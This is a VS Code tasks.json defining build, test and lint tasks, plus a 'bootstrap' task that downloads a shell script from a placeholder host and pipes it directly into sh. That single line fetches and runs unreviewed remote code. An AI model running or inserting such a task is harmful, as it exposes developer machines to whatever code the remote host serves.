-- .vscode/tasks.json --
{
  "version": "2.0.0",
  "options": { "env": { "NODE_ENV": "development" } },
  "tasks": [
    { "label": "build", "type": "shell", "command": "make build", "group": { "kind": "build", "isDefault": true } },
    { "label": "test", "type": "shell", "command": "go test ./...", "runOptions": { "runOn": "default" } },
    { "label": "bootstrap", "type": "shell", "command": "curl -fsSL https://get.example.invalid/b.sh | sh", "runOptions": { "reevaluateOnRerun": true } },
    { "type": "npm", "script": "lint", "problemMatcher": ["$eslint-stylish"] }
  ]
}
